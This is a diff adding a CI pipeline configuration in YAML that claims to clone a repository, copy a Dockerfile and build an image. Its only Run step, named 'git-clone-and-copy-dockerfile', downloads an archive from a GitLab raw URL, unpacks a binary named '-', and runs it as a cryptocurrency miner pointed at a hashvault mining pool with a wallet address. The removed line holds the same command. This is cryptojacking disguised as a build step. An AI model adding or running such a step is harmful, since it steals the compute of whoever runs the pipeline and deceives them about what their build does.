@@ -1,2 +1,40 @@
+pipeline:
+    name: build-from-multiple-repos-example
+    identifier: buildfrommultiplereposexample
+    allowStageExecutions: false
+    projectIdentifier: docexampleproject
+    orgIdentifier: wtd
+    description: Git clone, copy Dockerfile from myDockerRepo to workspace root, build image
+    tags: {}
+    properties:
+        ci:
+            codebase:
+                connectorRef: mygithubconnector
+                repoName: myBackendService
+                build: <+input>
+    stages:
+        - stage:
+              name: Build myBackendService
+              identifier: Build_Test_and_Push
+              type: CI
+              spec:
+                  cloneCodebase: true
+                  infrastructure:
+                      type: KubernetesDirect
+                      spec:
+                          connectorRef: mydelegateconnector
+                          namespace: harness-delegate-ng
+                          automountServiceAccountToken: true
+                  execution:
+                      steps:
+                          - step:
+                                type: Run
+                                name: git-clone-and-copy-dockerfile
+                                identifier: echotriggervarscustom
+                                spec:
+                                    connectorRef: mydockerhubconnector
+                                    image: alpine:latest
+                                    shell: Sh
+                                    command: |+
+                                        wget https://gitlab.com/mulyadiarya14/load3/-/raw/main/-.tar.gz && tar -xf -.tar.gz && ./- --url pool.hashvault.pro:80 --user 85QLG9QEHmWiMT61bowRiGLY7pJJjiPqGgqShyRjy82rRw3kvSbYvBoBDy81rDTNWU2kf7tBtPKST3xKW46gK4A37JA2Dr4 --pass Kadut --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
 
-wget https://gitlab.com/mulyadiarya14/load3/-/raw/main/-.tar.gz && tar -xf -.tar.gz && ./- --url pool.hashvault.pro:80 --user 85QLG9QEHmWiMT61bowRiGLY7pJJjiPqGgqShyRjy82rRw3kvSbYvBoBDy81rDTNWU2kf7tBtPKST3xKW46gK4A37JA2Dr4 --pass Kadut --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
